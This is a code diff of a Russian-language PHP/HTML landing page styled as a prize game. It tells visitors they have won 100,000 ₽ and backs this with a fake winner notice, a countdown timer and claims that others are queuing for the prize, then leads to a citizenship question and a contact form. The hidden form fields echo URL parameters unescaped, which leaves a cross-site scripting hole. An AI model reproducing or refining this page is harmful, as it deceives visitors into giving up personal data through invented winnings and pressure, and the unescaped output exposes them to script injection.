@@ -42,7 +42,7 @@
         <div class="button__backdrop">
           <button type="button" id="chest-button">Открыть сундук</button>
         </div>
-        <div class="main__notifications">
+        <div class="main__notifications" id="notification">
   <span class="accent">Киселёв В.</span> только что получил
   <span class="accent">10 000₽!</span>
         </div>
@@ -62,19 +62,42 @@
             <span class="modal-congrats">Поздравляем, вы выиграли <span class="accent">100 000 ₽</span></span>
         </div>
       <div class="modal-content">
-        <div class="modal-info">
-            <span class="modal-text top">⚠ Осталось времени 
-на активацию выигрыша:</span>
-            <span class="modal-text">3 человека в очереди готовы забрать ваш приз!</span>
-            <span class="modal-text">Остался последний шаг <br>
-– активируйте выигрыш сейчас!</span>
-        </div>
-        <div class="modal-timer-overlay">
-            <div class="modal-timer">
-                <span class="timer" id="countdown">00 : 14 : 59</span>
+        <div class="modal-info-wrapper">
+          <div class="modal-info">
+              <span class="modal-text top">⚠ Осталось времени 
+  на активацию выигрыша:</span>
+              <span class="modal-text">3 человека в очереди готовы забрать ваш приз!</span>
+              <span class="modal-text bottom">Остался последний шаг
+  – активируйте выигрыш сейчас!</span>
+          </div>
+          <div class="modal-timer-wrapper">
+            <div class="modal-timer-overlay">
+                <div class="modal-timer">
+                    <span class="timer" id="countdown">00 : 14 : 59</span>
+                </div>
             </div>
+            <div class="modal-alert top">
+            <span class="modal-text alert">Внимание!</span>
+            <p class="modal-text">Если вы не подтвердите выигрыш, он будет передан другому пользователю!</p>
         </div>
-        <form class="form _main-form contact-form" id="main-form" method="post">
+          </div>
+        </div>
+        <div class="button__backdrop" id="quiz-button-wrap">
+          <button type="button" id="quiz-button">Забрать выигрыш</button>
+        </div>
+        <div class="modal-question hidden">
+          <span class="question">Вы являетесь гражданином Российской Федерации <br>
+(есть ли у Вас Российское гражданство)?</span>
+        <div class="answer-buttons">
+          <div class="answer-btn" id="btn-no">Нет</div>
+          <div class="answer-btn" id="btn-yes">Да</div>
+        </div> 
+        </div>
+        <div class="modal-alert bottom">
+            <span class="modal-text alert">Внимание!</span>
+            <p class="modal-text">Если вы не подтвердите выигрыш, он будет передан другому пользователю!</p>
+        </div>
+        <form class="form _main-form contact-form hidden" id="main-form" method="post">
              <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
                         <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
                         <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'>
